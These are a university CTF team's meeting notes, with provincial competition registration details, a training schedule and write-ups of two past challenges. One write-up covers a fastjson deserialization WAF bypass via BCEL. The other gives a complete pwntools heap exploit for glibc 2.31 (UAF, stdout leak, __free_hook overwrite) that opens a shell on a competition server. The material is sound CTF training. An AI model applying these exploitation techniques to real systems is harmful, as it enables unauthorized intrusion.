# CTF Week Meeting 2022-04-07

1. Guangdong Province University CTF.
1. Offline schedule.

## 第二节广东大学生网络安全攻防大赛

* 5月15日前，各高校遴选参加全省比赛队伍，一所学校可有多组队伍参赛；

* 5月21日至22日，组织省级初赛评审，初赛内容为30%知识赛+70%攻防夺旗赛，按照成绩高低取前30名队伍进入省级总决赛，每个高校晋级队伍不超过2个；

* 报名时间：截止至2022年5月15日（星期日）17:00。

* 报名方式：参赛学校填写相关报名表，将省级初赛报名表（附件3）发至指定邮箱tw@hzu.edu.cn；同时，加入赛事咨询QQ群825405920。

The sign-up would be collected and submitted once.

According to the previous event, there are some problems:

- 初赛环境老是炸，最后30多分钟都炸了，答案都提交不了
- 晋级塞，，题目也偶尔会出现断开的问题，，第二个web题，，竟然一开始直接返回空，后来又可以了？？不知道是不是只有我遇到这个问题，，晕
- 而且，，晋级赛竟然不是uuid式动态flag。。。。？

(From https://tari.moe/2021/05/23/2021gd-university-ctf/)

### old

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760418752-b865074d-9996-4124-9701-27a1d538b73f.png?x-oss-process=image/resize,w_1500)

任意文件读取，不过`flag.txt` 读不了，但可以看 `hint.txt`，`smali` 字节码，提示了 `fastjson 1.2.24`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760515093-2a7d7537-dbf4-4af9-8e00-e7a14793ccc3.png?x-oss-process=image/resize,w_1500)

先读取本进程相关目录

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760490943-6c4f7d45-000f-4264-9468-0a350d8e903f.png?x-oss-process=image/resize,w_1500)

在 `/usr/local/run/start.jar` 获取源码，`IDEA`打开分析

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760584530-866b5ced-1454-4e9d-a8b0-41d22bea5dac.png?x-oss-process=image/resize,w_1500)

原来过滤了 `flag` ，怪不得读取不了

往反序列化方向，不过有`waf`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760611948-c43a881f-7f5a-48d9-9d39-8e0414bc6b5a.png?x-oss-process=image/resize,w_1500)

然后还有限制

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760625986-96f94ee6-263e-4788-b98c-d11876db5817.png?x-oss-process=image/resize,w_1500)

这里卡了挺久，试了网上很多EXP，都不行

然后突然想起fastjson反序列化的原理

一般是需要别的库的配合，通过反射获取相关方法的

于是我一个个依赖找

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760678227-0b26923e-f3e0-4e62-bac0-a994df337c10.png?x-oss-process=image/resize,w_1500)

搜了下 spring ，没有相关漏洞，但是在 `tomcat dbcp` 里刚好发现了可以利用，而且不用利用 `rmi ldap` 之类的

https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html

然后刚好用到 `BCEL`，HFCTF2021也刚好用到， 刚好复现过了，所以非常熟练 （

https://github.com/f1tz/BCELCodeman

编写 `java poc`，转换为 `class` 然后生成 `BCEL` 码

这样可以`绕过waf的黑名单`，即绕过了第1个`challenge`

还有2个 `challenge`，这个简单，就长度大于`2000`，然后需要包含 `flag` 关键字

这里直接把 `/flag.txt `改一下名读取即可

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760281491-24e583bd-f4a6-455b-8f81-454db979a055.png?x-oss-process=image/resize,w_1500)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760259579-5427e664-5368-4f57-9987-88549b6b215f.png?x-oss-process=image/resize,w_1500)

### BabyNote

题目是基于 glibc 2.31 的菜单堆题。

漏洞出现在 free 之后没有置零指针导致的 UAF ：

![image-20210524162332431](https://codeantenna.com/image/https://img-blog.csdnimg.cn/img_convert/b8a01cdd12b8b17e0e7750382d826e2e.png)



程序没有输出函数，倒是有一个提示的函数 gift 函数，输出堆地址最低两个字节，没用明白，到最后也不关他的事情。

**思路**：

1. 利用 tcache double 和 scanf 输出长字符串触发 malloc_consolidate 获取 main_arena 地址
2. 爆破倒数第四个数字，将堆分配到 stdout 结构体上，修改 flag 和 write_base 地址泄露出 libc 地址
3. 利用 tcache dup get shell

遇到的问题就是直接之前 libc 2.23 的 payload 去打的话没有回显出 libc 地址，原来的 payload ：

```python
p64(0x0FBAD1887) +p64(0)*3 + p8(0x88)
1
```

flag 这么设置绕过检查没有问题，问题是将 write_base 最低值字节修改为 0x88 了，而 libc 2.31 中 write_ptr 最低位是 0x23

![image-20210524170155561](https://codeantenna.com/image/https://img-blog.csdnimg.cn/img_convert/14e42897c6102444b4480b29ffb56694.png)

导致起始地址比结束地址大，而没有东西输出。还有就是调试断点位置设置问题 ，导致一直以为是修改不成功的原因。断点一开始是打在修改后下一次进入主菜单的时候，由于每次输出都会刷新 stdout 结构体部分指针，导致一直以为没修改成功。正确应该在 read 打断点，然后 n 跳一步查看是否成功修改结构体。

#### EXP

```python
from pwn import *
# context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']



def add(content):
    p.sendlineafter(">>> ",str(1))
    p.sendafter("Input Content:\n",content)
def gift():
    p.sendlineafter(">>> ",str(666))
def delete(id):
    p.sendlineafter(">>> ",str(3))
    p.sendlineafter("Input ID:\n",str(id))
def edit(id,content):
    p.sendlineafter(">>> ",str(2))
    p.sendlineafter("Input ID:\n",str(id))
    p.sendafter("Input Content:\n",content)

def exp():
    add('a'*58)#0
    add('a'*58)#1
    add('a'*58)#2
    for _ in range(8):
        delete(0)
        edit(0,'b'*0x58)
    edit(0,'\x00'*0x10)
    p.sendlineafter(">>> ",'1'*0x450)
    edit(0,'\xa0\x66')

    stdout_offset = libc.symbols['_IO_2_1_stdout_']
    log.info("stdout_offset:"+hex(stdout_offset))

    add('c'*0x8)#3
    # gdb.attach(p,"b *$rebase(0x1392)")
    # raw_input()
    add(p64(0x0FBAD1887) +p64(0)*3 + p8(0x00))#4
    libc_addr = u64(p.recvuntil('\x7f',timeout=1)[-6:].ljust(8,'\x00'))-(0x7fbe678e5980-0x7fbe676fa000)#- (0x7ffff7fac980-0x7ffff7dc1000)
    log.info("libc_addr:"+hex(libc_addr))

    free_hook = libc_addr+libc.sym['__free_hook']
    system_addr = libc_addr+libc.sym['system']
    binsh_str = libc_addr+libc.search('/bin/sh').next()

    delete(1)
    edit(1,p64(free_hook)*2)
    add('/bin/sh\x00')
    add(p64(system_addr))
    delete(1)

    p.interactive()


# p = process("./BabyNote",env={'LD_PRELOAD':'./libc-2.31.so'})
# libc = ELF("./libc-2.31.so")
# exp()

if __name__ == '__main__':
    # p = process("./BabyNote",env={'LD_PRELOAD':'./libc-2.31.so'})
    # libc = ELF("./libc-2.31.so")
    # p = process("./BabyNote")
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    p = remote("8.134.14.168", 10000)
    libc = ELF("./libc-2.31.so")
    while True:
        try:
            exp()
            exit(0)
        except:
            p.close()
            p = remote("8.134.14.168", 10000)
            # p = process("./BabyNote",env={'LD_PRELOAD':'./libc-2.31.so'})
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172
```

![WX20210523-133922](https://codeantenna.com/image/https://img-blog.csdnimg.cn/img_convert/eee450cda48ffaa4bc9e789d53fefe21.png)

## Offline Activity Schedule

We have returned to the campus yesterday.

Looking forward to our offline activity.

* We are going to use the expert-beginner cooperating method.
* The training competition would be more serious.
* CTF platform would collect self-designed challenges and closed competition challenges.
* Some competition schedules would be replaced with AWD competition.

## Note

- [ ] 第一届题目搜集发布
